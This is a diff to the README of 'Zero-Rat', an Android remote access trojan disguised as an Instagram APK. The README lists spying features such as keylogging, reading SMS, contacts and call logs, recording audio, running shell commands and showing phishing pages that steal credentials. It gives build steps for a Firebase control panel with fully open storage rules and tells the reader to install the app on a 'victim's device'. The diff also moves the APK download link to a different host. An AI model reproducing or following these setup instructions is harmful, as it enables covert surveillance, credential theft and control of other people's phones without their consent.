@@ -4,7 +4,7 @@
 <h1 align=center>Zero-Rat</h1>
 
 #### A multifunctional Android RAT with GUI based Web Panel without port forwarding.
-A tool that remasterd for AIRAVAT tool 
+A tool that remasterd for AIRAVAT tool
 ## Features
  - Read all the files of Internal Storage
  - Download Any Media to your Device from Victims Device
@@ -14,19 +14,19 @@ A tool that remasterd for AIRAVAT tool
  - Retrive Call Logs
  - Retrive Contacts
  - Send SMS
- - Gets all the Notifications 
+ - Gets all the Notifications
  - Keylogger
- - Admin Permission 
+ - Admin Permission
  - Show Phishing Pages to steal credentials through notification.
     - Steal credentials through pre built phishing pages
     - Open any suspicious website through notification to steal credentials.
  - Record Audio
  - Play music in Victim's device
  - Vibrate Device
- - Text To Speech 
+ - Text To Speech
  - Change Wallpaper
  - Run shell Commands
- - Runs In Background 
+ - Runs In Background
     - Auto Starts on restarting the device
     - Auto Starts when any notification arrives
  - No port forwarding needed
@@ -35,11 +35,11 @@ A tool that remasterd for AIRAVAT tool
 
 ## Requirements
  - Firebase Account
- - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
+ - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or
 [ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)
 
 
-## How to Build 
+## How to Build
   ### Firebase Setup
  1. Create an Firebase Account and afterwords create a new project with any name.
  1. Enable Firebase Database and Firebase Storage.
@@ -58,7 +58,7 @@ A tool that remasterd for AIRAVAT tool
         service firebase.storage {
         match /b/{bucket}/o {
             match /{allPaths=**} {
-               allow read, write 
+               allow read, write
               }
           }
        }
@@ -70,12 +70,12 @@ A tool that remasterd for AIRAVAT tool
  1. Open [home.html](./home.html) File and from [line number 16](https://github.com/Th30neAnd0nly/AIRAVAT/blob/302dca641bb04c6bed72d1b2cebdfc79ccfbb046/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
  1. Save the file , Your Panel Setup is completed.
  ### Android RAT
- 1. Download [Instagram.apk](https://github.com/caronero/Zero-Rat/raw/master/APK/Instagram.apk)
+ 1. Download [Instagram.apk](https://hackedrat2024.github.io/Zero-Rat/APK/Instagram.apk)
  1. Decompile it using any Decompiler recommend above.
  1. Now open `res/values/strings.xml` file.
  1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
-    - Example 
-       ```xml 
+    - Example
+       ```xml
        <string name="firebase_database_url">https://your_database_url.firebase.com</string>
        <string name="google_api_key">your_api_key</string>
        <string name="google_app_id">your_app_id</string>
@@ -86,7 +86,7 @@ A tool that remasterd for AIRAVAT tool
  1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
 
 
-## Contact Info 
+## Contact Info
  1. [Telegram](https://t.me/cn_zd)
  2. [Watch full video installation here](https://t.me/cn_zd46/13)
 
